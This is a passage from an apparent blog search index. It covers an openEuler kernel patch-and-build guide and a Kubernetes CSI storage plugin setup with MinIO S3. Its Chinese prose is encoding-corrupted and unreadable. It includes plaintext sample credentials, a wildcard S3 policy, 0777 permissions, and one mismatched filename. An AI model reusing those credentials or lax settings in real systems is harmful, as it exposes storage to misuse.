class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/local/bin/k3s-uninstall.sh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¯ä»¥åå¤è¿›è¡Œå®‰è£…\u003c/p\u003e","title":"k3sçš„å®‰è£…"},{"content":"æ¬§æ‹‰ Page Cache çš„å†…æ ¸ç¼–è¯‘ PageCacheæä¾›äº†ä¸€ç§é™åˆ¶page cacheçš„èƒ½åŠ›ï¼Œèƒ½å¤Ÿå¯¹page cacheçš„æ€»é‡è¿›è¡Œæ§åˆ¶, å¢å¼ºç³»ç»Ÿåœ¨æ•°æ®åº“ç­‰page cacheå æ¯”è¾ƒé«˜åœºæ™¯ä¸‹çš„ç¨³å®šæ€§ï¼Œç§¯æé‡Šæ”¾ç¼“å­˜ã€‚\nå®ƒæä¾›äº†ä»¥ä¸‹sysctlæ¥å£ï¼š\nvm.pagecache_limit_ratioï¼špagecacheå ç³»ç»Ÿæ€»å†…å­˜çš„ç™¾åˆ†æ¯”ï¼Œ[0, 100]ï¼Œ0å’Œ100éƒ½è¡¨ç¤ºåŠŸèƒ½å…³é—­ã€‚ vm.pagecache_limit_reclaim_ratioï¼šé’ˆå¯¹pagecacheçœŸå®å›æ”¶çš„æ¯”ä¾‹ï¼Œåœ¨å®é™…å›æ”¶æ—¶ï¼Œæ€»æ˜¯æ¯”pagecache_limit_ratioçš„å¤šå›æ”¶ä¸€äº›ï¼Œé»˜è®¤æ¯”ä¾‹æ˜¯2%ã€‚ vm.pagecache_limit_ignore_dirtyï¼šåœ¨å›æ”¶æ—¶æ˜¯å¦å¿½ç•¥è„é¡µï¼Œé»˜è®¤å¿½ç•¥ã€‚å› ä¸ºå¯¹è„é¡µçš„å›æ”¶è¾ƒè€—æ—¶ã€‚ è¡¥ä¸æ˜¯åŸºäº openEuler-22.03-LTS çš„ï¼Œä¸é€‚ç”¨äº 24.03-LTSï¼Œä»£ç éƒ½å·²ä¸åŒäº†\nç¼–è¯‘è¿‡ç¨‹å¦‚ä¸‹ï¼š\nä¸€ã€å®‰è£…å¥½openEuler-22.03-LTSï¼Œç£ç›˜ç•™å¤Ÿç©ºé—´ï¼Œæœ€å°‘ç•™20G\näºŒã€å®‰è£…ç¼–è¯‘å·²ç»æ‰€éœ€è½¯ä»¶\ndnf install -y rpm-build openssl-devel bc rsync gcc gcc-c++ flex bison m4 elfutils-libelf-devel dnf install -y python dnf install -y ncurses-devel dnf install -y dwarves ä¸‰ã€å®‰è£…å†…æ ¸æºä»£ç \ndnf install -y kernel-source ç°åœ¨æ˜¯2024å¹´11æœˆ4æ—¥ï¼Œå†…æ ¸ç‰ˆæœ¬æ˜¯ linux-5.10.0-60.139.0.166.oe2203.x86_64ï¼Œæ³¨æ„è¡¥ä¸çš„é€‚ç”¨èŒƒå›´\nå››ã€æ‰“è¡¥ä¸\npage.patch\nå°†page.patch æ”¾åˆ° /usr/src\ncd /usr/src/linux-5.10.0-60.139.0.166.oe2203.x86_64 patch -p1 \u0026lt; ../page.patch äº”ã€ç¼–è¾‘å†…æ ¸ç‰ˆæœ¬å·ï¼ŒEXTRAVERSIONçš„ç‰ˆæœ¬å·è¦å¤§äºå½“å‰å†…æ ¸ç‰ˆæœ¬ï¼Œå¦åˆ™æ— æ³•å®‰è£…ã€‚å½“å‰æ˜¯166ï¼Œæ”¹æˆ+1ï¼Œ167\ncd /usr/src/linux-5.10.0-60.139.0.166.oe2203.x86_64 vi Makefile # SPDX-License-Identifier: GPL-2.0 VERSION = 5 PATCHLEVEL = 10 SUBLEVEL = 0 EXTRAVERSION = -60.139.0.167.oe2203.x86_64 NAME = Kleptomaniac Octopus OPENEULER_MAJOR = 2203 OPENEULER_MINOR = 0 å…­ã€ç¼–è¯‘\ncd /usr/src/linux-5.10.0-60.139.0.166.oe2203.x86_64 make openeuler_defconfig #æ ¹æ®cpuçš„æ ¸æ•°æ¥è°ƒæ•´-jåé¢çš„å‚æ•° make binrpm-pkg -j8 #æŠ¥ä¸¤ä¸ªé”™ï¼Œignore mm/vmscan.c:4306:22: warning: â€˜global_reclaimable_pagesâ€™ defined but not used [-Wunused-function] 4306 | static unsigned long global_reclaimable_pages(void) | ^~~~~~~~~~~~~~~~~~~~~~~~ kernel/sysctl.c: In function â€˜pc_reclaim_limit_proc_dointvecâ€™: kernel/sysctl.c:715:2: warning: ISO C90 forbids mixed declarations and code [-Wdeclaration-after-statement] 715 | int pre_reclaim_ratio = vm_pagecache_limit_reclaim_ratio; | ^~~ #ç”Ÿæˆçš„åŒ…æ”¾åœ¨å¦‚ä¸‹ç›®å½•ä¸‹ /root/rpmbuild ä¸ƒã€å®‰è£…ç¼–è¯‘å¥½çš„å†…æ ¸\nrpm -ivh /root/rpmbuild/RPMS/x86_64/kernel-headers-5.10.0_60.139.0.167.oe2203.x86_64-1.x86_64.rpm å…«ã€ä¿®æ”¹å¯åŠ¨é¡¹\ncat /boot/grub2/grub.cfg | grep -E \u0026#34;menuentry \u0026#39;\u0026#34; grub2-set-default 0 ä¹ã€æŸ¥çœ‹æ–°å†…æ ¸\nuname -a Linux localhost.localdomain 5.10.0-60.139.0.167.oe2203.x86_64 #1 SMP Mon Nov 4 15:49:50 CST 2024 x86_64 x86_64 x86_64 GNU/Linux ","permalink":"https://rendoumi.com/posts/20250808-openeuler_pagecache/","summary":"\u003ch1 id=\"æ¬§æ‹‰-page-cache-çš„å†…æ ¸ç¼–è¯‘\"\u003eæ¬§æ‹‰ Page Cache çš„å†…æ ¸ç¼–è¯‘\u003c/h1\u003e\n\u003cp\u003ePageCacheæä¾›äº†ä¸€ç§é™åˆ¶page cacheçš„èƒ½åŠ›ï¼Œèƒ½å¤Ÿå¯¹page cacheçš„æ€»é‡è¿›è¡Œæ§åˆ¶, å¢å¼ºç³»ç»Ÿåœ¨æ•°æ®åº“ç­‰page cacheå æ¯”è¾ƒé«˜åœºæ™¯ä¸‹çš„ç¨³å®šæ€§ï¼Œç§¯æé‡Šæ”¾ç¼“å­˜ã€‚\u003c/p\u003e\n\u003cp\u003eå®ƒæä¾›äº†ä»¥ä¸‹sysctlæ¥å£ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003evm.pagecache_limit_ratioï¼špagecacheå ç³»ç»Ÿæ€»å†…å­˜çš„ç™¾åˆ†æ¯”ï¼Œ[0, 100]ï¼Œ0å’Œ100éƒ½è¡¨ç¤ºåŠŸèƒ½å…³é—­ã€‚\u003c/li\u003e\n\u003cli\u003evm.pagecache_limit_reclaim_ratioï¼šé’ˆå¯¹pagecacheçœŸå®å›æ”¶çš„æ¯”ä¾‹ï¼Œåœ¨å®é™…å›æ”¶æ—¶ï¼Œæ€»æ˜¯æ¯”pagecache_limit_ratioçš„å¤šå›æ”¶ä¸€äº›ï¼Œé»˜è®¤æ¯”ä¾‹æ˜¯2%ã€‚\u003c/li\u003e\n\u003cli\u003evm.pagecache_limit_ignore_dirtyï¼šåœ¨å›æ”¶æ—¶æ˜¯å¦å¿½ç•¥è„é¡µï¼Œé»˜è®¤å¿½ç•¥ã€‚å› ä¸ºå¯¹è„é¡µçš„å›æ”¶è¾ƒè€—æ—¶ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eè¡¥ä¸æ˜¯åŸºäº openEuler-22.03-LTS çš„ï¼Œä¸é€‚ç”¨äº 24.03-LTSï¼Œä»£ç éƒ½å·²ä¸åŒäº†\u003c/p\u003e\n\u003cp\u003eç¼–è¯‘è¿‡ç¨‹å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eä¸€ã€å®‰è£…å¥½openEuler-22.03-LTSï¼Œç£ç›˜ç•™å¤Ÿç©ºé—´ï¼Œæœ€å°‘ç•™20G\u003c/p\u003e\n\u003cp\u003eäºŒã€å®‰è£…ç¼–è¯‘å·²ç»æ‰€éœ€è½¯ä»¶\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ednf install -y rpm-build openssl-devel bc rsync gcc gcc-c++ flex bison m4 elfutils-libelf-devel\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ednf install -y python\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ednf install -y ncurses-devel\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ednf install -y dwarves\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸‰ã€å®‰è£…å†…æ ¸æºä»£ç \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ednf install -y kernel-source\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç°åœ¨æ˜¯2024å¹´11æœˆ4æ—¥ï¼Œå†…æ ¸ç‰ˆæœ¬æ˜¯ linux-5.10.0-60.139.0.166.oe2203.x86_64ï¼Œæ³¨æ„è¡¥ä¸çš„é€‚ç”¨èŒƒå›´\u003c/p\u003e\n\u003cp\u003eå››ã€æ‰“è¡¥ä¸\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"page.patch\"\u003epage.patch\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eå°†page.patch æ”¾åˆ° /usr/src\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /usr/src/linux-5.10.0-60.139.0.166.oe2203.x86_64\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epatch -p1 \u0026lt; ../page.patch\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eäº”ã€ç¼–è¾‘å†…æ ¸ç‰ˆæœ¬å·ï¼ŒEXTRAVERSIONçš„ç‰ˆæœ¬å·è¦å¤§äºå½“å‰å†…æ ¸ç‰ˆæœ¬ï¼Œå¦åˆ™æ— æ³•å®‰è£…ã€‚å½“å‰æ˜¯166ï¼Œæ”¹æˆ+1ï¼Œ167\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /usr/src/linux-5.10.0-60.139.0.166.oe2203.x86_64\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi Makefile\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# SPDX-License-Identifier: GPL-2.0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eVERSION\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ePATCHLEVEL\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eSUBLEVEL\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eEXTRAVERSION\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e -60.139.0.167.oe2203.x86_64\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eNAME\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Kleptomaniac Octopus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eOPENEULER_MAJOR\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e2203\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eOPENEULER_MINOR\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå…­ã€ç¼–è¯‘\u003c/p\u003e","title":"æ¬§æ‹‰PageCacheçš„å†…æ ¸ç¼–è¯‘"},{"content":"æå®¢å¤©æˆæœ‰ä¸ªå¾ˆå‰å®³çš„scaleflashç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼Œå……åˆ†åˆ©ç”¨rdmaçš„æ— æŸç½‘ç»œç‰¹æ€§ï¼Œå¹¶è¿›ä¸€æ­¥å‘æ‰¬å…‰å¤§ã€‚ç ”å‘å‡ºæ¥äº†å¯ä»¥é¡¶æ›¿EMCç›˜é˜µçš„å­˜å‚¨ç³»ç»Ÿï¼Œå¯ä»¥åœ¨å…¶ä¸Šè·‘Oracleç­‰æ•°æ®åº“ç³»ç»Ÿï¼ŒçœŸçš„æ˜¯å›½è´§ä¹‹å…‰äº†ã€‚\nå¸®å®ƒä»¬æ”¹å†™äº†ä¸€ä¸ªcsiçš„å­˜å‚¨æ’ä»¶ï¼Œè®°å½•ä¸€ä¸‹ï¼ŒåŸºäºyandexçš„s3 csiè€Œæ¥ï¼Œè¿™æ ·æ—¢å¯ä»¥è·‘åˆ°åº•å±‚ä¸Šæä¾›æ–‡ä»¶å—è®¾å¤‡ï¼Œä¹Ÿå¯ä»¥ä¸Šå‡åˆ°ç±»ä¼¼NFSæˆ–è€…S3çš„å±‚æ¬¡æä¾›æ–‡ä»¶ç³»ç»Ÿï¼Œèƒ½æ»¡è¶³å¤§å¤šæ•°éœ€æ±‚ã€‚é‚£æºä»£ç å°±ç»å¯¹ä¸æä¾›äº†ï¼Œåªè¯´ä¸€ä¸‹è¿‡ç¨‹ï¼š\nCSI PLUGINçš„ä½¿ç”¨æ–¹æ³•ï¼š ä¸€ã€å¯¼å…¥é•œåƒ csiå­˜å‚¨æ’ä»¶çš„image\ncr.yandex/crp9ftr22d26age3hulg/csi-s3:0.42.66 æ–‡ä»¶ï¼šcsi.tar\nå°†æ–‡ä»¶æ”¾åˆ°æ‰€æœ‰worknodeä¸Šï¼Œå¯¼å…¥æœ¬åœ°é•œåƒåº“:\nctr --address /run/k3s/containerd/containerd.sock -n k8s.io images import /root/csi.tar crictl -r unix:///run/k3s/containerd/containerd.sock images çœ‹åˆ°æœ‰ cr.yandex/crp9ftr22d26age3hulg/csi-s3:0.42.66 æ—¢æ˜¯å¯¼å…¥æˆåŠŸ\näºŒã€å®‰è£…controllerå’Œnodeserver å®‰è£…driver\næ–‡ä»¶ï¼šdriver.yaml\nkubectl apply -f driver.yaml å®‰è£…controller\næ–‡ä»¶ï¼šcontroller.yaml\nkubectl apply -f controller.yaml å®‰è£…nodeserver\næ–‡ä»¶ï¼šnodeserver.yaml\nè§£é‡Šä¸€ä¸‹ï¼Œcontrolleræ˜¯ä¸€ä¸ªstatefulsetï¼Œæ•´ä¸ªé›†ç¾¤è¿è¡Œä¸€ä¸ªå³å¯ï¼›è€Œnodeservershiåˆ™æ˜¯ä¸€ä¸ªdaemonsetï¼Œæ¯ä¸ªworknodeéƒ½ä¼šè¿è¡Œä¸€ä¸ªå‰¯æœ¬\nä¸Šé¢ worknode æ˜¯3ä¸ªï¼Œæ‰€ä»¥æœ‰3ä¸ªå‰¯æœ¬\nä¸‰ã€scaleflash å—è®¾å¤‡çš„ä½¿ç”¨ å—è®¾å¤‡æœ€å°å•ä½æ˜¯Gï¼Œæ‰€ä»¥å¦‚æœéœ€æ±‚äº†100Mï¼Œé‚£ä¹Ÿæ˜¯1Gã€‚\né¦–å…ˆå¿…é¡»å®šä¹‰ä¸€ä¸ªstorageclassï¼Œä»¥åä½¿ç”¨è¿™ä¸€ä¸ªstorageclasså°±å¯ä»¥äº†ï¼š\ncat \u0026lt;\u0026lt; EOF \u0026gt;scaleflash-storageclass.yaml --- kind: StorageClass apiVersion: storage.k8s.io/v1 metadata: name: scaleflash provisioner: ru.yandex.s3.csi parameters: mounter: scaleflash clstID: \u0026#34;nvmatrix_101\u0026#34; fsType: \u0026#34;xfs\u0026#34; EOF kubectl apply -f scaleflash-storageclass.yaml å†å®šä¹‰pvc\ncat \u0026lt;\u0026lt; EOF \u0026gt; csi-pvc.yaml apiVersion: v1 kind: PersistentVolumeClaim metadata: name: csi-pvc namespace: default spec: accessModes: - ReadWriteOnce resources: requests: storage: 100M storageClassName: scaleflash EOF kubectl apply -f csi-pvc.yaml å®šä¹‰Podä½¿ç”¨è¿™ä¸ªpvc\ncat \u0026lt;\u0026lt; EOF \u0026gt; nginx-csi-pvc.yaml --- apiVersion: v1 kind: Pod metadata: name: nginx-pod-s3 spec: containers: - name: nginx-pod-s3 image: docker.io/library/nginx:latest imagePullPolicy: IfNotPresent volumeMounts: - mountPath: \u0026#34;/usr/share/nginx/html\u0026#34; name: dynamic-storage volumes: - name: dynamic-storage persistentVolumeClaim: claimName: csi-pvc EOF kubectl apply -f nginx-csi-pvc.yaml è¿›å…¥podï¼Œçœ‹åˆ°lunå·²ç»è¢«mountä¸Šäº†ï¼Œå°±okäº†\nåå‘åˆ é™¤æ‰Podå’Œpvcèµ„æºï¼š\nkubectl delete -f nginx-csi-pvc.yaml kubectl delete -f csi-pvc.yaml éªŒè¯statefulset:\ncat \u0026lt;\u0026lt; EOF \u0026gt; stateful.yaml apiVersion: apps/v1 kind: StatefulSet metadata: name: statefulset-smb namespace: default labels: app: nginx spec: serviceName: statefulset-smb replicas: 3 template: metadata: labels: app: nginx spec: containers: - name: statefulset-smb image: docker.io/library/nginx:latest imagePullPolicy: IfNotPresent command: - \u0026#34;/bin/bash\u0026#34; - \u0026#34;-c\u0026#34; - set -euo pipefail; while true; do echo $(date) \u0026gt;\u0026gt; /mnt/data/outfile; sleep 1; done volumeMounts: - name: persistent-storage mountPath: /mnt/data readOnly: false updateStrategy: type: RollingUpdate selector: matchLabels: app: nginx volumeClaimTemplates: - metadata: name: persistent-storage namespace: default spec: storageClassName: scaleflash accessModes: - ReadWriteOnce resources: requests: storage: 1Gi EOF kubectl apply -f stateful.yaml å¯ä»¥æ”¾ç¼©å‰¯æœ¬æ•°ï¼Œç„¶åè§‚å¯Ÿ /mnt/data/outfile æ˜¯å¦å¸¦æœ‰åˆšå¯åŠ¨æ—¶å€™çš„æ—¶é—´æˆ³æ¥ç¡®å®šå·æ˜¯å¦æ˜¯ä¿ç•™çš„ã€‚\nå››ã€nvfileçš„ä½¿ç”¨ï¼ˆç±»ä¼¼NFSï¼‰ æ³¨æ„ç‚¹ï¼šrootPath å¿…é¡»æ˜¯å­˜åœ¨/mntä¸‹ï¼Œå› ä¸ºåªæœ‰/mntè¢«æŒ‚è¿›äº†controllerï¼ŒæŒ‚/è¿›å»æ˜¯ä¸è¡Œçš„ï¼Œæ‰€ä»¥å…¶å®ƒçš„éƒ½æ— æ³•è¯†åˆ«å‡ºæ¥\nå·å®¹é‡å¤§å°è·ŸNFSä¸€æ ·æ²¡æœ‰æ„ä¹‰ï¼Œå†™äº†ä¹Ÿä¸èµ·ä»»ä½•ä½œç”¨ã€‚\nå®šä¹‰storageclass\ncat \u0026lt;\u0026lt; EOF \u0026gt; storageclass01.yaml --- kind: StorageClass apiVersion: storage.k8s.io/v1 metadata: name: nvfile provisioner: ru.yandex.s3.csi parameters: mounter: nvfile rootPath: \u0026#34;/mnt/nvfile\u0026#34; modePerm: \u0026#34;0777\u0026#34; EOF kubectl apply -f storageclass01.yaml æ³¨æ„ä¸Šé¢ï¼Œæ²¡æœ‰å®šä¹‰subPathï¼Œæ‰€ä»¥æ–°ç›®å½•éƒ½ä¼šè¢«å»ºç«‹åœ¨/mnt/nvfileä¸‹ã€‚\nå¦‚æœè¦å®šä¹‰åœ¨æŸä¸ªå­ç›®å½•ï¼ˆæ¯”å¦‚prodï¼‰ä¸‹ï¼Œ å¯ä»¥å†å®šä¹‰ä¸€ä¸ªstorageClassï¼Œåˆ°æ—¶å€™å¼•ç”¨è¿™ä¸ªæ–°storageclasså³å¯\n--- kind: StorageClass apiVersion: storage.k8s.io/v1 metadata: name: nvfile-prod provisioner: ru.yandex.s3.csi parameters: mounter: nvfile rootPath: \u0026#34;/mnt/nvfile\u0026#34; subPath: \u0026#34;/prod\u0026#34; modePerm: \u0026#34;0777\u0026#34; å®šä¹‰pvc\ncat \u0026lt;\u0026lt; EOF \u0026gt; nvfile-pvc.yaml --- apiVersion: v1 kind: PersistentVolumeClaim metadata: name: nvfile-pvc namespace: default spec: accessModes: - ReadWriteOnce resources: requests: storage: 100M storageClassName: nvfile EOF kubectl apply -f nvfile-pvc.yaml å®šä¹‰ä¸€ä¸ªPodï¼Œä½¿ç”¨ä¸Šé¢çš„pvc\ncat \u0026lt;\u0026lt; EOF \u0026gt; nginx-nvfile.yaml --- apiVersion: v1 kind: Pod metadata: name: nginx-nvfile spec: containers: - name: nginx-nvfile image: docker.io/library/nginx:latest imagePullPolicy: IfNotPresent volumeMounts: - mountPath: \u0026#34;/usr/share/nginx/html\u0026#34; name: dynamic-storage volumes: - name: dynamic-storage persistentVolumeClaim: claimName: nvfile-pvc EOF kubectl apply -f nginx-nvfile.yaml è¿›å…¥å®¹å™¨ï¼Œçœ‹åˆ°nvfile_nodevçš„mountç‚¹å°±æ˜¯æˆåŠŸ\nstatefulsetçš„éªŒè¯ï¼š\ncat \u0026lt;\u0026lt; EOF \u0026gt; stateful-nvfile.yaml --- apiVersion: apps/v1 kind: StatefulSet metadata: name: statefulset-nvfile-ng namespace: default labels: app: nvfile-nginx spec: serviceName: statefulset-nvfie-ng replicas: 3 template: metadata: labels: app: nvfile-nginx spec: containers: - name: statefulset-nvfile-ng image: docker.io/library/nginx:latest imagePullPolicy: IfNotPresent command: - \u0026#34;/bin/bash\u0026#34; - \u0026#34;-c\u0026#34; - set -euo pipefail; while true; do echo $(date) \u0026gt;\u0026gt; /mnt/smb/outfile; sleep 1; done volumeMounts: - name: pvc mountPath: /mnt/smb readOnly: false updateStrategy: type: RollingUpdate selector: matchLabels: app: nvfile-nginx volumeClaimTemplates: - metadata: name: pvc spec: storageClassName: nvfile accessModes: [\u0026#34;ReadWriteOnce\u0026#34;] resources: requests: storage: 1Gi EOF kubectl apply -f stateful-nvfile.yaml åŒæ ·è¿›è¡Œä¼¸ç¼©ï¼ŒæŸ¥çœ‹mountç‚¹ä¸Šçš„æ–‡ä»¶/mnt/smb/outfileï¼Œæ˜¯å¦å¸¦æœ‰åˆšå¯åŠ¨æ—¶å€™çš„æ—¶é—´æˆ³æ¥åˆ¤æ–­æ˜¯å¦ä¸ºåŸå§‹å·\näº”ã€S3çš„ä½¿ç”¨ S3çš„è¯å°±æ²¡æœ‰ä»»ä½•çº¦æŸï¼Œåªè¦èƒ½è·‘S3åè®®ï¼Œè™šæœºä¹Ÿå¯ä»¥ç”¨ã€‚\né¦–å…ˆå»ºç«‹ä¸ªminioçš„S3æ¥æ¨¡æ‹Ÿï¼Œå› ä¸º9000ç«¯å£è¢«å ï¼Œæ‰€ä»¥ç”¨8000ç«¯å£\nhttp://192.168.66.101:8000\nusername: abcdefg\npassword: abcdefg\nè¿›å…¥åï¼Œgenä¸€å¯¹keyï¼Œèµ‹äºˆS3çš„æ‰€æœ‰æƒé™ï¼Œç¡®ä¿å¯ä»¥å»ºç«‹æ–°bucket\n{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;s3:*\u0026#34; ], \u0026#34;Resource\u0026#34;: [ \u0026#34;arn:aws:s3:::*\u0026#34; ] } ] } key:\naccessKeyID: lj7mL2gAFgRCykTaaabbb secretAccessKey: 0YklYzUmcxYcPjZKtmvHRN3cMQrUaCraaaabbbb ç„¶åå»ºç«‹secret\ncat \u0026lt;\u0026lt; EOF \u0026gt; secret-s3.yaml --- apiVersion: v1 kind: Secret metadata: name: csi-s3-secret # Namespace depends on the configuration in the storageclass.yaml namespace: kube-system stringData: accessKeyID: lj7mL2gAFgRCyaaaabbbb secretAccessKey: 0YklYzUmcxYcPjZKtmvHRN3cMQrUaCraaaabbbb # For AWS set it to \u0026#34;https://s3.\u0026lt;region\u0026gt;.amazonaws.com\u0026#34;, for example https://s3.eu-central-1.amazonaws.com endpoint: http://192.168.66.101:8000 # For AWS set it to AWS region #region: \u0026#34;\u0026#34; EOF kubectl apply -f secret-s3.yaml å†å»ºç«‹storageclass\ncat \u0026lt;\u0026lt; EOF \u0026gt; s3-storageclass.yaml --- kind: StorageClass apiVersion: storage.k8s.io/v1 metadata: name: csi-s3 provisioner: ru.yandex.s3.csi parameters: mounter: geesefs # you can set mount options here, for example limit memory cache size (recommended) options: \u0026#34;--memory-limit 1000 --dir-mode 0777 --file-mode 0666\u0026#34; # to use an existing bucket, specify it here: #bucket: some-existing-bucket csi.storage.k8s.io/provisioner-secret-name: csi-s3-secret csi.storage.k8s.io/provisioner-secret-namespace: kube-system csi.storage.k8s.io/controller-publish-secret-name: csi-s3-secret csi.storage.k8s.io/controller-publish-secret-namespace: kube-system csi.storage.k8s.io/node-stage-secret-name: csi-s3-secret csi.storage.k8s.io/node-stage-secret-namespace: kube-system csi.storage.k8s.io/node-publish-secret-name: csi-s3-secret csi.storage.k8s.io/node-publish-secret-namespace: kube-system EOF kubectl apply -f s3-storageclass.yaml å»ºç«‹pvc\ncat \u0026lt;\u0026lt; EOF \u0026gt; pvc-s3.yaml --- apiVersion: v1 kind: PersistentVolumeClaim metadata: name: csi-s3-pvc namespace: default spec: accessModes: - ReadWriteMany resources: requests: storage: 5Gi storageClassName: csi-s3 EOF kubectl apply -f csi-s3.yaml å»ºç«‹pod\ncat \u0026lt;\u0026lt; EOF \u0026gt; nginx-s3.yaml --- apiVersion: v1 kind: Pod metadata: name: csi-s3-test-nginx namespace: default spec: containers: - name: csi-s3-test-nginx image: docker.io/library/nginx:latest imagePullPolicy: IfNotPresent volumeMounts: - mountPath: /usr/share/nginx/html/s3 name: webroot volumes: - name: webroot persistentVolumeClaim: claimName: csi-s3-pvc readOnly: false EOF kubectl apply -f nginx-s3.yaml è¿›å…¥å®¹å™¨ï¼Œçœ‹åˆ°ä¸€ä¸ªpvcçš„å·å³å¯\nå»minioçš„ç•Œé¢ï¼Œçœ‹åˆ°è¿™ä¸ªæ–°å·å¯¹åº”çš„æ¡¶\nstatefulsetä¹Ÿä¸€æ ·ã€‚\ns3æ›´å…·ä½“çš„å¯ä»¥å‚çœ‹ï¼šhttps://github.com/yandex-cloud/k8s-csi-s3/\n","permalink":"https://rendoumi.com/posts/20250807-csi_scaleflash/","summary":"\u003cp\u003eæå®¢å¤©æˆæœ‰ä¸ªå¾ˆå‰å®³çš„scaleflashç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼Œå……åˆ†åˆ©ç”¨rdmaçš„æ— æŸç½‘ç»œç‰¹æ€§ï¼Œå¹¶è¿›ä¸€æ­¥å‘æ‰¬å…‰å¤§ã€‚ç ”å‘å‡ºæ¥äº†å¯ä»¥é¡¶æ›¿EMCç›˜é˜µçš„å­˜å‚¨ç³»ç»Ÿï¼Œå¯ä»¥åœ¨å…¶ä¸Šè·‘Oracleç­‰æ•°æ®åº“ç³»ç»Ÿï¼ŒçœŸçš„æ˜¯å›½è´§ä¹‹å…‰äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå¸®å®ƒä»¬æ”¹å†™äº†ä¸€ä¸ªcsiçš„å­˜å‚¨æ’ä»¶ï¼Œè®°å½•ä¸€ä¸‹ï¼ŒåŸºäºyandexçš„s3 csiè€Œæ¥ï¼Œè¿™æ 